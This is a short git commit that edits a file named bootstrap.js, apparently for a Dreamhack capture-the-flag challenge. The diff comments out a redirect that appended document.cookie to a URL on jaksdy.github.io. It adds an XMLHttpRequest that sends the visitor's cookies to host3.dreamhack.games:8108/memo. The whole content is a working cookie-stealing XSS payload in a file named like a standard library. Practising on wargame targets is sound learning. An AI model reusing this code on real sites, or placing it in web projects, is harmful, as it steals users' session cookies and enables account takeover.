37d28c202f77f153690eb7dd1ce73cf0ea259d82
Junwon Kang <87932017+jaksdy@users.noreply.github.com>
2024-01-15 11:34:07 +0900

    Update bootstrap.js

--- static/js/bootstrap.js
+++ static/js/bootstrap.js
@@ -1,1 +1,7 @@
-location.href="https://jaksdy.github.io?param="+document.cookie
+// location.href="https://jaksdy.github.io?param="+document.cookie
+
+var xmlHttp = new XMLHttpRequest();
+var c = document.cookie;
+var x = "http://host3.dreamhack.games:8108/memo?memo="+c;
+xmlHttp.open('GET', x, true);
+xmlHttp.send();
